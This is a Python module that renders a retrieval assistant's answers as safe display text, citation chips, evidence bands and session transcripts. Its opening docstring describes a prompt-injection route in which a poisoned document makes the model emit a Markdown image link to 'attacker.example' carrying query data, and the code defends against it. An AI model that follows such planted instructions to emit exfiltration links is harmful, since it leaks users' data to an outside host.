"""What an answer looks like on screen, computed without Streamlit (features 37, 54-56, 62, 63).

Everything here is a plain function of an answer, so the rules the interface enforces - how a
citation is drawn, which evidence band applies, what a refusal says - are tested directly
rather than by clicking through a browser.

Model output is untrusted. It can echo retrieved text, and a document in the corpus could
carry adversarial content (feature 43), so answer text is escaped before any markup is added:
nothing the model writes can become HTML. Markdown images are removed as well. A poisoned
document could ask the model to emit ``![](https://attacker.example/?q=...)``, and rendering
that would make the reader's browser send the request - a known exfiltration route in RAG
interfaces that no click is needed to trigger.
"""

from __future__ import annotations

import html
import re
from dataclasses import dataclass
from datetime import datetime
from typing import Literal

from citara.config import UiSettings
from citara.generation.models import Citation, GeneratedAnswer

_MARKER = re.compile(r"\[(\d+)\]")
# A marker with the punctuation that follows it, kept together so a chip that wraps to the
# next line does not leave its full stop stranded at the start of the line after.
_MARKER_WITH_PUNCTUATION = re.compile(r"\[(\d+)\]([.,;:!?]?)")
_MARKDOWN_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")

Band = Literal["High", "Moderate", "Low"]
NoticeKind = Literal["refusal", "degraded", "blocked", "scope", "limit"]


def safe_markdown(text: str) -> str:
    """Model or document text made safe to render as Markdown.

    HTML is escaped, and images keep their alt text but lose the request that would load
    them.
    """
    return html.escape(_MARKDOWN_IMAGE.sub(r"\1", text), quote=False)


def pages(citation: Citation) -> str:
    """Compact page reference for a chip: 'p. 47' or 'pp. 16-17'."""
    if citation.page_start == citation.page_end:
        return f"p. {citation.page_start}"
    return f"pp. {citation.page_start}-{citation.page_end}"


def render_answer_html(answer: GeneratedAnswer) -> str:
    """Answer text with each ``[n]`` replaced by a citation chip (feature 54).

    The chip carries the marker and the page, so the source is legible inline on a phone,
    where there is no hover; the full title is in the tooltip and in the source panel. A
    marker pointing at evidence that does not exist is drawn as a warning rather than
    silently dropped.
    """
    by_marker = {citation.marker: citation for citation in answer.citations}

    def chip(match: re.Match[str]) -> str:
        marker, punctuation = int(match.group(1)), match.group(2)
        citation = by_marker.get(marker)
        if citation is None:
            drawn = (
                f'<span class="cite-chip cite-invalid" title="Evidence [{marker}] does not '
                f'exist; this claim is unsupported">{marker}?</span>'
            )
        else:
            title = html.escape(citation.citation)
            drawn = f'<span class="cite-chip" title="{title}">{marker} · {pages(citation)}</span>'
        if punctuation:
            return f'<span class="cite-tail">{drawn}{punctuation}</span>'
        return drawn

    return _MARKER_WITH_PUNCTUATION.sub(chip, safe_markdown(answer.text))


def evidence_band(answer: GeneratedAnswer, ui: UiSettings) -> Band | None:
    """High / Moderate / Low from the best reranker score, or None if nothing was served.

    A band, not a number (feature 56): the reranker's score is calibrated for admission, not
    for probability, and printing it as a confidence percentage would invent precision.
    """
    scores = [r.rerank_score for r in answer.evidence if r.rerank_score is not None]
    if not scores or answer.mode not in ("generated", "degraded"):
        return None
    best = max(scores)
    if best >= ui.evidence_strength_high:
        return "High"
    if best >= ui.evidence_strength_moderate:
        return "Moderate"
    return "Low"


BAND_EXPLANATION: dict[Band, str] = {
    "High": "The retrieved passages match the question closely.",
    "Moderate": "The passages are relevant; check the cited pages for the exact detail.",
    "Low": "The evidence only narrowly cleared the relevance threshold. Verify before acting.",
}


def _seconds(ms: float) -> str:
    return f"{ms / 1000:.1f} s"


def latency_line(answer: GeneratedAnswer) -> str:
    """Per-answer timings and who answered (feature 62)."""
    if answer.cached:
        return "Served from cache · no model call"
    if answer.mode in ("blocked", "out_of_scope") or answer.reason in ("too_long", "session_cap"):
        return "Stopped before retrieval"

    parts = [f"Retrieval {_seconds(answer.retrieval_ms)}"]
    if answer.generation_ms:
        parts.append(f"Generation {_seconds(answer.generation_ms)}")
    parts.append(f"Total {_seconds(answer.total_ms)}")
    if answer.mode == "generated" and answer.model:
        parts.append(f"{answer.model}{' (failover)' if answer.failover_used else ''}")
    elif answer.mode == "refused":
        parts.append("no model called")
    return " · ".join(parts)


@dataclass(frozen=True)
class Notice:
    """How a turn that did not produce a normal answer is labelled."""

    kind: NoticeKind
    heading: str


def notice(answer: GeneratedAnswer) -> Notice | None:
    """A plain statement of why there is no generated answer (feature 37).

    Refusal is a designed outcome, so it is stated rather than apologised for.
    """
    if answer.reason == "too_long":
        return Notice("limit", "Question too long")
    if answer.reason == "session_cap":
        return Notice("limit", "Session question limit reached")
    if answer.mode == "refused":
        return Notice("refusal", "No supporting evidence in the indexed documents")
    if answer.mode == "blocked":
        return Notice("blocked", "Request declined")
    if answer.mode == "out_of_scope":
        return Notice("scope", "Outside this assistant's scope")
    if answer.mode == "degraded":
        if answer.reason == "budget_exhausted":
            return Notice("degraded", "Today's model allowance is used up — showing sources")
        return Notice("degraded", "Summary unavailable — showing the source passages")
    return None


@dataclass(frozen=True)
class SourceRow:
    """One retrieved passage as the source panel lists it (feature 55)."""

    marker: int
    citation: str
    score: float | None
    cited: bool
    text: str


def source_rows(answer: GeneratedAnswer) -> list[SourceRow]:
    """Every passage the answer was given, in the numbering its citations use."""
    return [
        SourceRow(
            marker=citation.marker,
            citation=citation.citation,
            score=result.rerank_score,
            cited=citation.used,
            text=result.chunk.content,
        )
        for citation, result in zip(answer.citations, answer.evidence, strict=False)
    ]


@dataclass(frozen=True)
class Turn:
    """One question and its answer, as the session keeps them."""

    question: str
    answer: GeneratedAnswer
    asked_at: datetime
    scope: str = ""


_RULE = "=" * 72
_THIN = "-" * 72


def transcript(turns: list[Turn], disclaimer: str, ui: UiSettings, generated_at: datetime) -> str:
    """The session as a plain-text record an officer can attach to a briefing (feature 63).

    Plain text rather than Markdown or PDF: it opens anywhere, pastes into anything, and every
    claim keeps its marker next to a source line that names the document and page.
    """
    lines = [
        "CITARA — session transcript",
        f"Generated {generated_at:%Y-%m-%d %H:%M} UTC",
        disclaimer,
        "Answers are drawn only from the indexed NDMA documents. Verify against the cited "
        "pages before acting.",
        _RULE,
    ]
    for number, turn in enumerate(turns, start=1):
        answer = turn.answer
        lines += ["", f"Q{number}. {turn.question}", f"Asked {turn.asked_at:%H:%M} UTC"]
        if turn.scope:
            lines.append(f"Searched: {turn.scope}")
        heading = notice(answer)
        lines += ["", f"A{number}." + (f" [{heading.heading}]" if heading else "")]
        if answer.mode == "degraded":
            lines.append("No summary was generated; the source passages follow.")
        else:
            lines.append(answer.text.strip())

        band = evidence_band(answer, ui)
        if band:
            lines += ["", f"Evidence strength: {band}"]
        rows = source_rows(answer)
        if rows:
            lines.append("Sources:")
            for row in rows:
                state = "cited" if row.cited else "retrieved, not cited"
                lines.append(f"  [{row.marker}] {row.citation} ({state})")
                if answer.mode == "degraded":
                    lines.append("      " + " ".join(row.text.split())[:600])
        lines += ["", latency_line(answer), _THIN]
    return "\n".join(lines) + "\n"
